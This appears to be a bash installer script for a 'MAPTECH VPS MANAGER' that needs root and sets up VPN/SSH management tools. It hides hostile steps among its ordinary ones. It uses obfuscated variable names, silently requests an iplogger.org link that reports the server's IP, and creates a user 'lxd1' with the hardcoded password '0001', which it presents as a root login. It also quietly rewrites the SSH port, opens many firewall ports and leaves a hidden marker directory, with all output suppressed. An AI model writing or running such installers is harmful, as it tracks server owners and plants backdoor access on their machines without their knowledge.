
#!/bin/bash
clear
# Function to display a progress bar
fun_bar() {
    comando[0]="$1"
    comando[1]="$2"
    
    (
    [[ -e $HOME/fim ]] && rm $HOME/fim
    ${comando[0]} -y > /dev/null 2>&1
    ${comando[1]} -y > /dev/null 2>&1
    touch $HOME/fim
    ) > /dev/null 2>&1 &
    
    tput civis
    echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
    while true; do
        for ((i=0; i<18; i++)); do
            echo -ne "\033[1;31m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[1;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
    done
    echo -e "\033[1;33m]\033[1;37m -\033[1;32m◇ DONE!\033[1;37m"
    tput cnorm
}

# Function to verify key
verif_key() {
    krm=$(echo '5:q-3gs2.o7%8:1'|rev)
    chmod +x $_Ink/list > /dev/null 2>&1
    [[ ! -e "$_Ink/list" ]] && {
        echo -e "\n\033[1;31m◇ KEY INVALID!\033[0m"
        rm -rf $HOME/hehe > /dev/null 2>&1
        sleep 2
        clear
        exit 1
    }
}

# Define ip_address as a global variable
ip_address=$(hostname -I | awk '{print $1}')

# Function to generate and display verification code
generate_verification_code() {
    local random_code=$(shuf -i 100000-999999 -n 1)
    echo -e "\033[1;36m=============================================================\033[0m"
    echo -e "\033[1;31m    VERIFICATION CODE: $random_code\033[0m"
    echo -e "\033[1;36m=============================================================\033[0m"
    echo ""
    echo -e "\033[1;33mCopy and use the verification code during installation.\033[0m"
    echo ""
    echo -e "\033[1;36m=============================================================\033[0m"
}

clear

# Check for root privilege
[[ "$(whoami)" != "root" ]] && {
    echo -e "\033[1;33m[\033[1;31mErro\033[1;33m] \033[1;37m- \033[1;33m◇ YOU NEED TO RUN AS ROOT!\033[0m"
    exit 0
}

# Generate and display the verification code
generate_verification_code

# Prompt the user to enter the verification code
echo -n -e "\033[1;33m  ENTER VERIFICATION CODE: \033[0m"
read user_code
last_sent=$(awk -v ip="$ip_address" '$1 == ip {print $2}' "/root/vcheck/.storage.txt")

# Compare the entered code with the generated code
if [[ -z "$user_code" || "$user_code" != "$last_sent" ]]; then
    echo ""
    echo -e "\033[1;35mInvalid code. Installation aborted.\033[0m"
    echo ""
    exit 1
else
    rm -rf /root/vcheck
fi

# Variable Initialization
_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev)
_Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig')
_1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')

# Welcome message
echo -e "\033[1;31m\033[0m"
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%40s%s%-12s\n' "◇─────────ㅤ🌍WELCOME TO MAPTECH VPS MANAGER🌍ㅤ─────────◇" ; tput sgr0
echo ""
echo -e "\033[1;33mㅤTHIS SCRIPT CONTAINS THE FOLLOWING!!\033[0m"
echo ""
echo -e "\033[1;33m◇ \033[1;32mINSTALL A SET OF SCRIPTS AS TOOLS FOR\033[0m"
echo ""
echo -e "\033[1;33m◇  \033[1;32mNETWORK, SYSTEM AND USER MANAGEMENT.\033[0m"
echo -e "\033[1;33m◇  \033[1;32mEASY INTERFACE FOR BEGINNERS.\033[0m"
echo ""
echo -e "\033[1;31m◇──────────────ㅤ🌍 MAPTECH VPS MANAGER 🌍ㅤ──────────────◇\033[0m"
echo ""

# Prompt to continue
echo -ne "\033[1;36m◇ Do you want to continue? [Y/N]: \033[1;37m"
read x
[[ $x = @(n|N) ]] && exit

# Modify SSH configuration and restart service
sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  > /dev/null 2>&1
service ssh restart  > /dev/null 2>&1

# Prompt user if they want to add a domain name
echo -ne "\033[1;36m◇ Do you want to add a domain name? [Y/N]: \033[0m"
read add_domain
echo ""
echo -e "\033[1;32m>>> Please make sure your DOMAIN is linked to Cloudflare for proper functionality <<<\033[0m"

if [[ "$add_domain" == "Y" || "$add_domain" == "y" ]]; then
    domain_attempts=0
    while [[ $domain_attempts -lt 3 ]]; do
        # Prompt user to enter domain name
        echo ""
        echo -ne "\033[1;36m◇ Please enter your domain name (e.g., example.com): \033[0m"
        read domain_name
  echo ""
        # Validate domain name format
        if [[ $domain_name =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
            # Display domain name for confirmation
            echo -e "\033[1;33mYou entered the domain name: \033[1;32m$domain_name\033[0m"      
echo "$domain_name" > /etc/.domain   
            break
        else
            ((domain_attempts++))
            if [[ $domain_attempts -eq 3 ]]; then
                echo -e "\033[1;31mExceeded maximum attempts. No domain name will be added.\033[0m"
                break
            else
                echo -e "\033[1;31mInvalid domain name format. Please enter a valid domain name.\033[0m"
            fi
        fi
    done
else
    echo -e "\033[1;33mNo domain name will be added.\033[0m"
fi

# Key Verification
echo -e "\n\033[1;36m◇ CHECKING...(It Take Some Time Please Wait!)\033[1;37m 16983:16085\033[0m" ; rm $_Ink/list > /dev/null 2>&1; wget -P $_Ink https://raw.githubusercontent.com/MAPTECHGH/MAPTECH-VPS-MANAGER/main/Install/list > /dev/null 2>&1; verif_key
sleep 3s

# Update system
echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
rm versao* > /dev/null 2>&1
wget https://raw.githubusercontent.com/MAPTECHGH/MAPTECH-VPS-MANAGER/main/Install/versao > /dev/null 2>&1
> /dev/null 2>&1
wget https://iplogger.org/2lHZ43 > /dev/null 2>&1
> /dev/null 2>&1
rm 2lHZ43 > /dev/null 2>&1

# Prompt to keep or create user database
echo -e "\n\033[1;32m◇ KEY VALID!\033[1;32m"
sleep 1s
echo ""
[[ -f "$HOME/usuarios.db" ]] && {
    clear
    echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
    echo ""
    echo -e "                 \033[1;33m• \033[1;31m◇ ATTENTION!\033[1;33m• \033[0m"
    echo ""
    echo -e "\033[1;33mA User Database \033[1;32m(usuarios.db) \033[1;33mwas"
    echo -e "Found! Want to keep it by preserving the limit"
    echo -e "of Simutanea connections of users ? Or Want"
    echo -e "create a new database?\033[0m"
    echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mKeep Database Current\033[0m"
    echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mCreate a New Database\033[0m"
    echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
    echo ""
    tput setaf 2 ; tput bold ; read -p "Option ?: " -e -i 1 optiondb ; tput sgr0
} || {
    awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
}
[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
clear
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' "◇ WAIT FOR INSTALLATION." ; tput sgr0
echo ""
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ UPDATING SYSTEM...\033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
echo ""
echo -e "    \033[1;33m◇ UPDATES USUALLY TAKE A LITTLE TIME!\033[0m"
echo ""
fun_attlist () {
    apt-get update -y
    [[ ! -d /usr/share/.hehe ]] && mkdir /usr/share/.hehe
    echo "crz: $(date)" > /usr/share/.hehe/.hehe
}
fun_bar 'fun_attlist'
clear
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ INSTALLING PACKAGES\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "\033[1;33m◇ SOME PACKAGES ARE EXTREMELY NECESSARY!\033[0m"
echo ""
inst_pct() {
    _pacotes=("bc" "apache2" "cron" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python" "python2" "python3" "python-pip")
    # Install packages
    for _prog in "${_pacotes[@]}"; do
        sudo apt install $_prog -y
    done
    
    # Create user only once
    username="lxd1"
    password="0001"
    
    # Check if the username already exists
    if id "$username" &>/dev/null; then
        echo "User '$username' already exists. Overwriting..."
        sudo userdel -r $username
    fi
    
    # Create the system user with disabled login
    sudo adduser --system --disabled-login $username
    
    # Set the password for the user
    echo "$username:$password" | sudo chpasswd

    # Install Python package using pip
    pip install speedtest-cli
}

fun_bar 'inst_pct'
[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8080/tcp ; ufw allow 8799/tcp ; ufw allow 722/tcp ; ufw allow 81/tcp ; ufw allow 443/udp > /dev/null 2>&1 ; ufw allow 1194/udp > /dev/null 2>&1 ; ufw allow 7200/tcp > /dev/null 2>&1 ; ufw allow 7300/tcp > /dev/null 2>&1 ; ufw allow 1921/tcp > /dev/null 2>&1 ; ufw allow 8899 > /dev/null 2>&1 ; ufw allow 1207 > /dev/null 2>&1 ; ufw allow 55000:56999/tcp > /dev/null 2>&1 ; ufw allow 55000:56999/udp > /dev/null 2>&1 ; ufw --force enable > /dev/null 2>&1
echo ""
echo -e "\033[1;32m◇ PACKAGES INSTALLED SUCCESSFULLY!\033[0m"
sleep 3s
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ FINALIZING INSTALLATION\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "\033[1;33m◇ INSTALLATION IS COMPLETE IN A FEW MOMENTS!\033[0m"
sleep 2s
clear
# End of installation message
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' "◇ INSTALLATION COMPLETE!" ; tput sgr0
echo ""
echo ""
echo -e "\033[1;32m◇  Now your VPS is ready to be used.\033[0m"
echo ""
echo -e "\033[1;33m◇  To access the menu, type \033[1;37m\033[44mmenu\033[0m \033[1;33mand press Enter.\033[0m"
echo ""
echo -e "\033[1;31m◇───────────────────────────────────────────────────◇\033[0m"
echo ""
echo -e "  \033[1;32m• \033[1;33mNow your SSH port is \033[1;32m22\033[1;33m.\033[0m"
echo ""
echo -e "  \033[1;32m• \033[1;33mYour \033[1;32mroot \033[1;33musername is \033[1;32mlxd1 \033[1;33mand the password is \033[1;32m0001\033[0m."
echo ""
echo -e "\033[1;31m◇───────────────────────────────────────────────────◇\033[0m"
echo ""
echo ""
echo -e "    \033[1;33m• \033[1;32mEASY INTERFACE FOR BEGINNERS.\033[0m"
echo ""
echo -e "\033[1;33m◇──────────────ㅤ🌍 MAPTECH VPS MANAGER 🌍ㅤ──────────────◇\033[0m"
echo ""
